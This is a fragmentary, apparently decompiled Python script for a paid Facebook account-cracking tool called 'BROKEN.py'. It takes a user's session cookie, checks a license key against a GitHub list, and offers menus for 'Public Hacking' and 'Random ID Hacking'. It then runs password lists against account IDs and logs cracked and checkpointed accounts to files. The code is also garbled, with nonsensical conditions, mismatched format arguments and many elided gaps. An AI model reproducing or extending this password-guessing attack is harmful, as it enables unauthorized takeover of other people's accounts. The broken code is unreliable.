...
if Exception:
    ...
    try:
        ...
        print ("[*]--------------------------------------------------------------")
        #yash ke jaga apna name or kch ni cherna
    ...
    r1=requests.get("https://github.com/yashkumar6/BROKEN/blob/main/approval.txt").text
    if key1 in r1:
...
def login_lagi334():
    ...
    print('-----------------------------------------------')
    jalan('\n%s %s%s Welcome To yash paid Tool.....' % (P, M, P))
    print('-----------------------------------------------')
    cookie = input('\n [+] Put Cookie : ')
    ...
    try:
        ...
        print(f'''  {x}[{h}•{x}]{h} LOGIN SUCCESSFUL.........Run the again command(\x1b[1;33mpython BROKEN.py)!!!!{x} ''')
        time.sleep(1)
        exit()
    finally:
        return None
...
def hasil(OK, cp):
    if not len(OK) != 0:
        pass
    if len(cp) != 0:
        print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mYash_OK.txt' % (H, P, str(len(ok))))
        print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mYash_CP.txt' % (H, P, str(len(cp))))
        input('\x1b[1;97mPress enter to back yash Menu ')
        menu(my_name, my_id)
        return None
...
def menu(my_name, my_id):
    ...
    print(logo)
    jalan('\n%s %s%s\x1b[1;32m              WELCOME  TO Yash paid TOOL ' % (P, M, P))
    jalan('\n%s %s%s\x1b[1;31m  Please Mera Youtube Channel Zaror Subscribe Karna Thanks' % (P, M, P))
    time.sleep(4)
    print('')
    os.system('clear')
    print(logo)
    ...
    if Baloch in ('', ' '):
        ...
        print('')
        time.sleep(1)
        print('\x1b[1;37m    Checking Subscription')
        print('')
        input('\n\x1b[1;37m  Type Your Real Name : \x1b[38;5;208m')
        time.sleep(1)
        print('')
    ...
    print('\x1b[1;97m [1] Public Hacking')
    print('\x1b[1;97m [2] Random ID Hacking')
    print('\x1b[1;97m [3] Start File Hacking \x1b[1;92m{Abe Lol hy next update} ')
    ...
    if jh in ('1', '01'):
        ...
        for x in titik:
            ...
            jalan('\n %s[%sâœ“%s] Retrun SC type "%spython BROKEN.py%s"' % (N, H, N, H, N))
            exit()
...
def setting():
    ...
    print(' \x1b[1;37m [2] START CRACK FROM NEW IDS(Good)')
    print(' \x1b[1;37m [3] START CRACK FROM RANDOM ID(Best)')
    hu = input('\n\x1b[1;32m[+]  CHOOSE : ')
    if hu in ('1', '01'):
...
def passwrd():
    ...
    print('-----------------------------------------------')
    print('\x1b[1;37m Total  IDs : %s ' % len(id))
    print('\x1b3[1;37m\r Hacking Started...\x1b[1;37m')
    print('-----------------------------------------------')
    ...
    for pw in pwv:
        ...
        try:
            ...
            if 'checkpoint' in po.cookies.get_dict().keys():
                print(f'''\r\x1b[38;5;208m [Yash-CP] {idf} | {pw}''')
